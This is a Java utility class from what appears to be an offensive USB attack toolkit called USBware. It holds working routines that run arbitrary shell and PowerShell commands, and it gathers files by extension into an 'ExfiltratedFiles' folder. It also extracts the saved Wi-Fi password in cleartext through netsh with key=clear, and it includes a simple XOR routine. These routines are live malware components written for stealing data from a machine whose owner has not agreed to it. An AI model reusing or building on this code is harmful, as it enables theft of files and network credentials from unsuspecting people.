package com.github.thatcherdev.usbware.backend;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.usbware.usbware.USBware;

public class Utils {

	/**
	 * Run {@link command} in Command Prompt and return response.
	 * 
	 * @param command command to run
	 * @return response to running command
	 */
	public static String runCommand(String command) {
		String resp="";
		BufferedReader bufferedReader=null;
		try{
			ProcessBuilder builder=new ProcessBuilder("cmd.exe", "/c", command);
			builder.redirectErrorStream(true);
			bufferedReader=new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
			while(true){
				String line=bufferedReader.readLine();
				if(line==null)
					break;
				resp+=line+"\n";
			}
			if(resp.isEmpty())
				return "Command did not produce a response";
			else
				return resp.substring(0, resp.length()-1);
		}catch(Exception e){
			return "An error occurred when trying to run command";
		}finally{
			try{
				if(bufferedReader!=null)
					bufferedReader.close();
			}catch(Exception e){}
		}
	}

	/**
	 * Run {@link command} in Bash and return response.
	 * 
	 * @param command command to run
	 * @return response to running command
	 */
	public static String runBashCommand(String command) {
		String resp="";
		BufferedReader bufferedReader=null;
		try{
			ProcessBuilder builder=new ProcessBuilder("bash", "-c", command);
			builder.redirectErrorStream(true);
			bufferedReader=new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
			while(true){
				String line=bufferedReader.readLine();
				if(line==null)
					break;
				resp+=line+"\n";
			}
			if(resp.isEmpty())
				return "Command did not produce a response";
			else
				return resp.substring(0, resp.length()-1);
		}catch(Exception e){
			return "An error occurred when trying to run command";
		}finally{
			try{
				if(bufferedReader!=null)
					bufferedReader.close();
			}catch(Exception e){}
		}
	}

	/**
	 * Run PowerShell script {@link script}.
	 * 
	 * @param script name of script to run
	 * @return Response from script
	 */
	public static String runPSScript(String script) {
		return runCommand("Powershell.exe -executionpolicy remotesigned -File scripts\\"+script);
	}

	/**
	 * Copies all files with extensions that match {@link exts} in {@link root} to
	 * 'gathered\ExfiltartedFiles'.
	 * 
	 * @param root directory to search though
	 * @param exts list of extensions
	 * @return state of completion
	 */
	public static boolean exfilFiles(String root, ArrayList<String> exts) {
		try{
			new File("gathered\\ExfiltratedFiles").mkdir();
			for(String ext:exts)
				for(String file:new ArrayList<String>(Arrays.asList(Utils.runCommand("c: && cd "+root+" && dir/b/s/a:-d *."+ext).split("\n"))))
					if(!file.equals("File Not Found"))
						FileUtils.copyFile(new File(file), new File("gathered\\ExfiltratedFiles\\"+file.substring(file.lastIndexOf("\\")+1)));
			return true;
		}catch(Exception e){
			return false;
		}
	}

	/**
	 * @return SSID and password of current WiFi connection.
	 */
	public static String currentConnection() {
		try{
			String interfaceInfo=runCommand("c: && cd C:\\Windows\\System32 && netsh wlan show interfaces");
			if(interfaceInfo.contains("Profile")){
				String interfaceLine=interfaceInfo.substring(interfaceInfo.lastIndexOf("Profile"));
				String ssid=interfaceLine.substring(interfaceLine.indexOf(":")+2, interfaceLine.indexOf("\n"));
				String pass=getPass(ssid);
				return "SSID:\t"+ssid+"\nPass:\t"+pass;
			}else
				throw new Exception();
		}catch(Exception e){
			return "SSID:\tN/A\nPass:\tN/A";
		}
	}

	/**
	 * @param ssid SSID of network to get password of
	 * @return password of WiFi network with SSID {@link ssid}
	 */
	private static String getPass(String ssid) {
		try{
			String ssidInfo=runCommand("c: && cd C:\\Windows\\System32 && netsh wlan show profiles "+ssid+" key=clear | findstr Key");
			if(ssidInfo.contains("Key Content")){
				return ssidInfo.substring(ssidInfo.indexOf(":")+2);
			}else
				throw new Exception();
		}catch(Exception e){
			return "N/A";
		}
	}

	/**
	 * @return IPv4 address of current machine
	 */
	public static String getIP() {
		try{
			Enumeration<NetworkInterface> majorInterfaces=NetworkInterface.getNetworkInterfaces();
			while(majorInterfaces.hasMoreElements()){
				NetworkInterface inter=(NetworkInterface) majorInterfaces.nextElement();
				for(Enumeration<InetAddress> minorInterfaces=inter.getInetAddresses();minorInterfaces.hasMoreElements();){
					InetAddress add=(InetAddress) minorInterfaces.nextElement();
					if(!add.isLoopbackAddress())
						if(add instanceof Inet4Address)
							return add.getHostAddress();
						else if(add instanceof Inet6Address)
							continue;
				}
			}
			throw new Exception();
		}catch(Exception e){
			USBware.error("Could not get IP address");
			return null;
		}
	}

	/**
	 * Encrypt or decrypt {@link input} with key {@link key} using XOR cryptography.
	 * 
	 * @param input String to encrypt or decrypt
	 * @param key
	 * @return encryped or decrypted String
	 */
	public static String crypt(String input, String key) {
		byte[] toCrypt=input.getBytes();
		byte[] secret=key.getBytes();
		String output="";
		int spos=0;
		for(int pos=0;pos<toCrypt.length;++pos){
			output+=(char) ((byte) (toCrypt[pos] ^ secret[spos]));
			++spos;
			if(spos>=secret.length)
				spos=0;
		}
		return output;
	}
}